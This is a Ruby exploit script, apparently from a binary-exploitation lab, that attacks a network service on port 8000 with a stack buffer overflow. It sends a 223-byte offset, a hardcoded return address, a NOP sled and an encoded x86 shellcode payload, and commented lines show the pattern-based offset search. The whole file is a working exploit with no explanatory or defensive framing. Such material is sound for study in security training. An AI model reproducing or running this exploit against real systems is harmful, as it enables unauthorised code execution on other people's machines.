#!/usr/bin/ruby

require 'socket'

def genPattern(n)
	pat = ''
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.each_char do |i|
		'abcdefghijklmnopqrstuvwxyz'.each_char do |j|
			'123456789'.each_char do |k|
				pat << i + j + k
			end
		end
	end
	return pat.slice(0, n)
end
host = ARGV[0]

shellcode = 
"\xd9\xcb\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x14\xbe\x51\x36" +
"\x25\xb9\x31\x73\x19\x83\xc3\x04\x03\x73\x15\xb3\xc3\x14" +
"\x62\xc4\xcf\x04\xd7\x79\x7a\xa9\x5e\x9c\xca\xcb\xad\xde" +
"\x70\x4a\x7c\xb6\x84\x72\xa1\xa5\xe3\x62\xf0\x79\x7d\x63" +
"\x98\x1f\x25\xa9\xdd\x56\x94\x35\x6d\x6c\xa7\x50\x5c\xec" +
"\x84\x2c\x38\x21\x8a\xde\x9c\xd3\xb4\xb8\xd3\xa3\x82\x41" +
"\x14\xcb\x3b\x9d\x97\x63\x2c\xce\x35\x1a\xc2\x99\x59\x8c" +
"\x49\x13\x7c\x9c\x65\xee\xff"
#The open method creates the socket and connects
sock = TCPSocket.open(host, 8000)

#receive the banner
puts sock.recv(1024)

#send our overflowing input
#buf = 'A'*2048
#buf = genPattern(2048)
#buf = 'A'*223 + 'BBBB' + 'C'*(2048-223-4)
eip = "\xe8\xf4\xff\xbf" #gdb
eip = "\x0c\xf5\xff\xbf" #non-gdb
buf = 'A'*223 + eip + "\x90"*(1024-223-4-shellcode.length) + shellcode

sock.print buf
puts "sent data buffer, next output will be response"
#receive the response
puts sock.recv(1024)


sock.close
